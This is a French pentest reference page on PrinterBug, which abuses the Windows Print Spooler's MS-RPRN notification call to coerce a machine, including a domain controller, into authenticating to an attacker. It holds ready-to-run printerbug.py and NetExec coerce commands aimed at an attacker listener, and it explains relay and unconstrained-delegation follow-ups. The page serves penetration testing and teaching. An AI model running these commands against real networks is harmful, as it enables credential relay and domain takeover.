---
title: "PrinterBug : coercer l'authentification via le spooler"
description: "Utilisation de l'appel de notification de changement MS-RPRN du Print Spooler pour forcer une machine cible, y compris un contrôleur de domaine, à s'authentifier auprès d'un attaquant via SMB, produisant l'authentification coercée qui alimente les attaques de relais NTLM et de délégation Kerberos."
keywords:
  - PrinterBug
  - SpoolSample
  - MS-RPRN
  - coercition
  - RpcRemoteFindFirstPrinterChangeNotification
---

# PrinterBug

Le **PrinterBug** transforme le spooler en moteur de coercition. Tout utilisateur authentifié peut appeler `RpcRemoteFindFirstPrinterChangeNotificationEx` sur le spooler d'une cible et lui demander d'envoyer les notifications de changement d'impression à un serveur du choix de l'appelant. La cible s'exécute en **s'authentifiant auprès de ce serveur avec son compte machine** via SMB, ce qui est exactement l'authentification coercée dont ont besoin les attaques de [relais NTLM](../../directory/active-directory/authentication/ntlm/relay.md) et de délégation Kerberos. Parce que le spooler tourne sur les contrôleurs de domaine, cela signifie souvent **coercer un DC**.

## Le déclencher

```bash
# Point the target's spooler at a listener; the target authenticates as its machine account
printerbug.py 'example.local/user:password'@<target> <attacker-listener>
# or the original SpoolSample (Windows), or dementor.py

# NetExec: without LISTENER it only checks; set LISTENER to actually coerce the callback
nxc smb <target> -u user -p password -M coerce_plus -o LISTENER=<attacker-ip>
```

## Ce que vous faites de l'auth coercée

L'authentification entrante du compte machine n'est utile qu'une fois relayée ou capturée :

- **Relais vers LDAP/AD CS** pour de la délégation contrainte basée sur les ressources, des shadow credentials, ou un certificat (l'authentification propre du DC est puissante).
- **Relais vers un autre hôte** où la machine coercée est administrateur local.
- **Capturer et casser**, ou relayer pour alimenter une capture par **délégation non contrainte** du TGT du DC.

## Notes d'exploitation

- Le spooler est activé par défaut et accessible par **tout utilisateur du domaine**, donc PrinterBug n'a besoin que d'un identifiant à faibles privilèges et d'un spooler accessible.
- C'est le partenaire classique de la [délégation non contrainte](../../directory/active-directory/authentication/kerberos/delegation/unconstrained.md) : coercez un DC vers un hôte que vous contrôlez et qui détient une délégation non contrainte, et vous capturez le TGT du DC.
- Là où le spooler est désactivé, repliez-vous sur d'autres surfaces de coercition (la même chaîne de relais s'applique quelle que soit la primitive de coercition qui l'alimente).
- Il s'agit de coercition, pas d'exécution de code ; pour obtenir SYSTEM sur l'hôte du spooler, voir [Point and Print](point-and-print.md).

## Outils

- **printerbug.py** (dirkjanm/krbrelayx), **SpoolSample** (leechristensen), **dementor.py** : déclenchent la coercition.
- **NetExec `-M coerce_plus`** : énumère et déclenche la coercition du spooler (et d'autres).
- **ntlmrelayx.py / krbrelayx.py** : relaient ou capturent l'authentification coercée.

## Références

- [The Hacker Recipes: PrinterBug](https://www.thehacker.recipes/ad/movement/print-spooler-service/printerbug)
- [SpoolSample (leechristensen)](https://github.com/leechristensen/SpoolSample)
- [krbrelayx / printerbug.py (dirkjanm)](https://github.com/dirkjanm/krbrelayx)
